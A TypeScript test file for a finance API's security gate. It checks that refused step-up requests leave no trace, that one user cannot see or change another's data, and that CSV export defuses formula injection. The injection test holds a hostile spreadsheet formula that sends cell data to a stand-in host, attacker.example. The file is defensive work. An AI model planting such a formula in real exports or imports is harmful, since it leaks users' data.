// SPDX-License-Identifier: MIT
/**
 * Phase 1 security gate — the tests the gate had to write because no existing
 * test could fail for the invariant it was supposed to be protecting.
 *
 * Everything here drives the real application through `createApiHarness` (real
 * guards, real CSRF hook, real Zod serialisers, real Postgres). Nothing is
 * mocked. Each block names the control it pins and, where the control was found
 * missing or weaker than advertised, says so in the test name rather than
 * asserting the broken behaviour silently.
 *
 * ## 1. Step-up refusals must leave no trace (wp1.7-quality.md §7 item 1)
 *
 * WP 1.7a read-audited the step-up guards and found that only the *link* test
 * asserts the negative side effect ("no `Sneaky Bank` connection exists
 * afterward"); the disconnect and reconnect tests check the 403 and stop. The
 * gate sabotaged both guards directly (`requireFreshSession` -> `requireSession`)
 * and confirmed each goes red — but red *only on the status code*. A guard that
 * was moved to after the side effect rather than removed would keep the 403 and
 * still destroy the credential. These tests close that.
 *
 * ## 2. Cross-user isolation (gate brief item 9)
 *
 * Single user today (D6: `user_id` on every table from the first migration,
 * multi-user additive later). That is exactly why these belong here now: the
 * scoping is being written today by people who can only ever observe one user,
 * so nothing they run can tell them whether they got it right. Every read and
 * every write is driven twice — once as the owner, once as a second account
 * holder — and the second must never see or touch the first's row.
 *
 * ## 3. CSV export is a file other programs execute (gate brief item 13)
 *
 * `GET /transactions/export.csv` emits RFC 4180 with every cell quoted, which is
 * correct CSV and not a defence: Excel, LibreOffice Calc and Google Sheets all
 * strip the quotes while parsing and then evaluate a leading `=`, `+`, `-` or
 * `@` as a formula (CWE-1236). The payee name on a transaction is *provider*
 * data — a Plaid merchant descriptor, or a row from a CSV the user was talked
 * into importing — so the content is attacker-reachable and the sink is a
 * spreadsheet on the user's own machine.
 */
import { DateOnly, money } from '@core/kernel';
import { manualTransaction } from '@connector/manual';
import { PlaidConnector } from '@connector/plaid';
import { fakePlaidItem, FakePlaidApi, linkSettings, testClock } from '@connector/plaid/test';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  createApiHarness,
  expectStatus,
  linkManual,
  NO_DATABASE,
  problemOf,
  type ApiHarness,
  type LinkedConnection,
  type TestSession,
} from '../helpers/api-harness.ts';

const CHECKING = 'checking';

interface ConnectionRow {
  readonly status: string;
  readonly sealed_credentials: Uint8Array | null;
  readonly transactions_cursor: string | null;
}

/** The `connections` row as `psql` sees it — status, credential, cursor. */
async function connectionRow(h: ApiHarness, connectionId: string): Promise<ConnectionRow> {
  const result = await h.database.pool.query(
    `SELECT status, sealed_credentials, transactions_cursor FROM connections WHERE id = $1`,
    [connectionId],
  );
  const row = result.rows[0] as ConnectionRow | undefined;
  if (row === undefined) throw new Error(`no connections row for ${connectionId}`);
  return row;
}

describe.skipIf(NO_DATABASE)('phase 1 gate', () => {
  let h: ApiHarness;
  let link: LinkedConnection;
  /** A second account holder, with a real users row and a real session. */
  let otherUserId: string;
  let other: TestSession;
  let otherFresh: TestSession;
  /**
   * A Plaid connection, purely so the credential-integrity assertions have a
   * credential to be about. `ManualConnector.connect` returns `credentials: {}`
   * and `createConnection` seals nothing for it, so `sealed_credentials` is
   * legitimately NULL on a manual row — asserting "not null" there would be
   * asserting a bug, which is how the gate found this out.
   */
  let plaidConnectionId: string;

  beforeAll(async () => {
    const api = new FakePlaidApi([]);
    api.addItem(
      fakePlaidItem({
        accessToken: 'access-gate-DO-NOT-LEAK-7c1e',
        publicToken: 'public-gate-DO-NOT-LEAK-4a9b',
        itemId: 'item-gate-1',
      }),
    );
    h = await createApiHarness({
      suite: 'gate1',
      plaidConnector: new PlaidConnector({ api, settings: linkSettings(), clock: testClock() }),
    });
    link = await linkManual(h, {
      providerConnectionId: 'gate-conn-1',
      displayName: 'Gate Bank',
      accounts: [
        { providerAccountId: CHECKING, name: 'Everyday', type: 'depository', currency: 'USD' },
      ],
      batch: {
        added: [
          manualTransaction({
            providerAccountId: CHECKING,
            providerTransactionId: 'gate-txn-1',
            amount: money(-2_500n, 'USD'),
            postedDate: DateOnly.parse('2026-06-01'),
            name: 'CORNER STORE',
          }),
        ],
        balances: [],
      },
    });

    const exchange = await h.request({
      method: 'POST',
      url: '/connections/plaid/exchange',
      session: h.fresh,
      body: { publicToken: 'public-gate-DO-NOT-LEAK-4a9b', institutionName: 'Gate Plaid Bank' },
    });
    expectStatus(exchange, 201);
    plaidConnectionId = (exchange.json() as { connectionId: string }).connectionId;

    otherUserId = await h.database.createUser('Second Holder');
    other = await h.issueSession({ userId: otherUserId, fresh: false });
    otherFresh = await h.issueSession({ userId: otherUserId, fresh: true });
  }, 240_000);

  afterAll(async () => {
    await h?.close();
  }, 60_000);

  // ------------------------------------------------------------------------
  // 1. Step-up refusals leave no trace
  // ------------------------------------------------------------------------

  it('a refused disconnect leaves the connection active and its sealed credential intact', async () => {
    const before = await connectionRow(h, plaidConnectionId);
    expect(before.status).toBe('active');
    expect(before.sealed_credentials).not.toBeNull();

    const response = await h.request({
      method: 'DELETE',
      url: `/connections/${plaidConnectionId}`,
      session: h.stale,
    });
    expect(response.statusCode).toBe(403);
    expect(problemOf(response)['code']).toBe('step_up_required');

    // The assertion WP 1.7a asked for: not just the status code. A guard placed
    // *after* `disconnectConnection` would still answer 403 and would already
    // have destroyed the credential and flipped the status by the time it did.
    const after = await connectionRow(h, plaidConnectionId);
    expect(after.status).toBe('active');
    expect(after.sealed_credentials).not.toBeNull();
  });

  it('a refused reconnect leaves the cursor and the credential untouched', async () => {
    const before = await connectionRow(h, link.connectionId);

    const response = await h.request({
      method: 'POST',
      url: `/connections/${link.connectionId}/reconnect`,
      session: h.stale,
      body: {
        input: {
          displayName: 'Gate Bank',
          providerConnectionId: 'gate-conn-1',
          accounts: [
            { providerAccountId: CHECKING, name: 'Everyday', type: 'depository', currency: 'USD' },
          ],
        },
      },
    });
    expect(response.statusCode).toBe(403);
    expect(problemOf(response)['code']).toBe('step_up_required');

    const after = await connectionRow(h, link.connectionId);
    expect(after.transactions_cursor).toBe(before.transactions_cursor);
    expect(after.status).toBe('active');
  });

  // ------------------------------------------------------------------------
  // 2. Cross-user isolation
  // ------------------------------------------------------------------------

  it('a second account holder cannot read the first holder’s connection', async () => {
    const detail = await h.request({
      method: 'GET',
      url: `/connections/${link.connectionId}`,
      session: other,
    });
    expect(detail.statusCode).toBe(404);

    const list = await h.request({ method: 'GET', url: '/connections', session: other });
    expectStatus(list, 200);
    expect((list.json() as { connections: unknown[] }).connections).toHaveLength(0);

    const runs = await h.request({
      method: 'GET',
      url: `/connections/${link.connectionId}/sync-runs`,
      session: other,
    });
    expect(runs.statusCode).toBe(404);
  });

  it('a second account holder cannot disconnect, reconnect or sync the first holder’s connection', async () => {
    const disconnect = await h.request({
      method: 'DELETE',
      url: `/connections/${link.connectionId}`,
      session: otherFresh,
    });
    expect(disconnect.statusCode).toBe(404);

    const reconnect = await h.request({
      method: 'POST',
      url: `/connections/${link.connectionId}/reconnect`,
      session: otherFresh,
      body: { input: {} },
    });
    expect(reconnect.statusCode).toBe(404);

    const sync = await h.request({
      method: 'POST',
      url: `/connections/${link.connectionId}/sync`,
      session: other,
    });
    expect(sync.statusCode).toBe(404);

    // And none of the above touched either row.
    expect((await connectionRow(h, link.connectionId)).status).toBe('active');
    const plaidRow = await connectionRow(h, plaidConnectionId);
    expect(plaidRow.status).toBe('active');
    expect(plaidRow.sealed_credentials).not.toBeNull();
  });

  it('a second account holder cannot stage a CSV onto the first holder’s connection', async () => {
    const response = await h.request({
      method: 'POST',
      url: '/imports/csv',
      session: other,
      body: {
        connectionId: link.connectionId,
        displayName: 'Injected',
        files: [
          {
            name: 'inject.csv',
            content: 'date,description,amount\n2026-06-02,INJECTED,-99.00\n',
            format: 'csv',
            presetId: 'us_signed',
            account: {
              providerAccountId: 'injected',
              name: 'Injected',
              type: 'depository',
              currency: 'USD',
            },
          },
        ],
      },
    });
    expect(response.statusCode).toBe(404);
  });

  it('a second account holder cannot read or write the first holder’s transaction', async () => {
    const list = await h.request({ method: 'GET', url: '/transactions', session: h.stale });
    expectStatus(list, 200);
    const items = (list.json() as { items: { id: string }[] }).items;
    expect(items.length).toBeGreaterThan(0);
    const transactionId = items[0]?.id as string;

    const read = await h.request({
      method: 'GET',
      url: `/transactions/${transactionId}`,
      session: other,
    });
    expect(read.statusCode).toBe(404);

    const patch = await h.request({
      method: 'PATCH',
      url: `/transactions/${transactionId}`,
      session: other,
      body: { note: 'written by the wrong user' },
    });
    expect(patch.statusCode).toBe(404);

    const bulk = await h.request({
      method: 'POST',
      url: '/transactions/bulk',
      session: other,
      body: { transactionIds: [transactionId], patch: { excluded: true } },
    });
    expect(bulk.statusCode).toBe(404);

    const splits = await h.request({
      method: 'POST',
      url: `/transactions/${transactionId}/splits`,
      session: other,
      body: {
        splits: [
          { amount: { minor: '-1500', currency: 'USD' }, userCategoryId: null, note: null },
          { amount: { minor: '-1000', currency: 'USD' }, userCategoryId: null, note: null },
        ],
      },
    });
    expect(splits.statusCode).toBe(404);

    // The owner's row is unchanged by any of it.
    const owner = await h.request({
      method: 'GET',
      url: `/transactions/${transactionId}`,
      session: h.stale,
    });
    expectStatus(owner, 200);
    const detail = owner.json() as { note: string | null; excluded: boolean };
    expect(detail.note).toBeNull();
    expect(detail.excluded).toBe(false);
  });

  it('the second holder’s transaction list and export are empty, not the first holder’s', async () => {
    const list = await h.request({ method: 'GET', url: '/transactions', session: other });
    expectStatus(list, 200);
    const body = list.json() as { items: unknown[]; summary: { count: number } | null };
    expect(body.items).toHaveLength(0);
    expect(body.summary?.count).toBe(0);

    const csv = await h.request({
      method: 'GET',
      url: '/transactions/export.csv',
      session: otherFresh,
    });
    expectStatus(csv, 200);
    expect(csv.body).not.toContain('CORNER STORE');
  });

  it('the accounts read model is scoped to the session user', async () => {
    const mine = await h.request({ method: 'GET', url: '/accounts', session: h.stale });
    expectStatus(mine, 200);
    expect((mine.json() as { accounts: unknown[] }).accounts.length).toBeGreaterThan(0);

    const theirs = await h.request({ method: 'GET', url: '/accounts', session: other });
    expectStatus(theirs, 200);
    expect((theirs.json() as { accounts: unknown[] }).accounts).toHaveLength(0);
  });

  // ------------------------------------------------------------------------
  // 3. CSV export formula injection
  // ------------------------------------------------------------------------

  it('neutralises a spreadsheet formula that arrived as provider data (CWE-1236)', async () => {
    // A payee name straight out of a provider feed. `csvCell` quotes it, which
    // is correct RFC 4180 and irrelevant: every spreadsheet strips the quotes
    // while parsing and then evaluates the leading `=`.
    const hostile = '=HYPERLINK("https://attacker.example/?x="&A1,"Click")';
    h.manualStore.append(link.providerConnectionId, {
      added: [
        manualTransaction({
          providerAccountId: CHECKING,
          providerTransactionId: 'gate-txn-formula',
          amount: money(-100n, 'USD'),
          postedDate: DateOnly.parse('2026-06-03'),
          name: hostile,
        }),
      ],
      balances: [],
    });
    const sync = await h.request({
      method: 'POST',
      url: `/connections/${link.connectionId}/sync`,
      session: h.stale,
    });
    expectStatus(sync, 202);

    const csv = await h.request({
      method: 'GET',
      url: '/transactions/export.csv',
      session: h.fresh,
    });
    expectStatus(csv, 200);
    expect(csv.body).toContain('attacker.example');

    // The cell holding it must not *start* a formula once the quotes come off.
    const line = csv.body.split('\n').find((row) => row.includes('attacker.example'));
    expect(line).toBeDefined();
    const cells = (line ?? '').split('","');
    const payee = cells.find((cell) => cell.includes('attacker.example')) ?? '';
    expect(
      ['=', '+', '-', '@', '\t', '\r'].some((lead) => payee.startsWith(lead)),
      `export cell begins with a formula lead-in: ${payee.slice(0, 40)}`,
    ).toBe(false);
  });
});
